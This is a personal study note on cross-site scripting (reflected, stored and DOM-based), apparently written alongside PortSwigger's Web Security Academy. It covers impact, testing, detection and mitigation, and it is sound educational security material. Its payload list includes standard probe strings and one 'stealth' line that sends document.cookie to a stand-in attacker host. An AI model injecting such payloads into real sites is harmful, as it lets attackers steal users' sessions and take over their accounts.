# XSS (Cross-Site Scripting)

---

## Metadata
> - **OWASP Category (2021):** A03 Injection  
> - **PortSwigger Link:** [What is cross-site scripting (XSS) and how to prevent it? | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)
>
> - **Sub-Topics:**
>   - Reflected XSS - Malicious script comes from the current HTTP request - visiting the URL executes the script   
>   - Stored XSS - Malicious script is received from an untrusted source - and is included within later HTTP responses untrusted. (Comments on blog post, contact details on an order, etc.)  
>   - DOM-based - Application contains client-side JS that processes data from an untrusted source via writing the data back to the DOM  

---

## 💡 Concept
> - **What is it?**
>   - Manipulating a website to return malicious JS to users, which would execute inside a victim’s browser… resulting in compromising their interaction with the application  
>   - Circumvents the same-origin policy (separates different websites from each other)  
>   - Can impersonate another user to access their data and carry out actions on their behalf  
>
> - **Impact**
>   - **Confidentiality:** Steal cookies, tokens, or sensitive user data  
>   - **Integrity:** Inject scripts to alter website content or user actions  
>   - **Availability:** Disrupt application functionality for users  

---

## 🛠 Exploitation Notes
> - **Where to test:**
>   - Entry point in application where input is returned in HTTP responses, and testing executable arbitrary JS  
>   - Somewhere where input in a parameter is placed in a DOM, and test each location  
>
> - **Payloads**
>   - Reflected: `<script>alert(1)</script> → now \`print()\` on Chrome since 2021`
>   - Attribute injection: `<img src=x onerror=alert(1)>`
>   - DOM-based: `<svg onload=alert(1)>`
>   - Stealth: `<script>fetch('https://attacker.com/cookie='+document.cookie)</script>`

---

## 🔍 Detection
> - Stored/Reflected = Crafted input that executed JS in entry points where HTTP responses are returned  
> - DOM = From URL parameters… see above where the input placed in a parameter is placed in the DOM, and test each location  
> - Burp Suite’s web vulnerability Scanner combines dynamic and static analysis  

---

## 🛡 Mitigation
> - Filter input on arrival via whitelist of allowed characters  
> - Encode data on output (HTTP responses)  
> - Appropriate response headers like `Content-Type` and `X-Content-Type-Options` to ensure proper interpretation  
> - Content Security Policies to reduce whichever XSS may still occur  

---

## Extras
> - **Cheat sheet / references:**  
>   [Cross-Site Scripting (XSS) Cheat Sheet – 2025 Edition | Web Security Academy](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
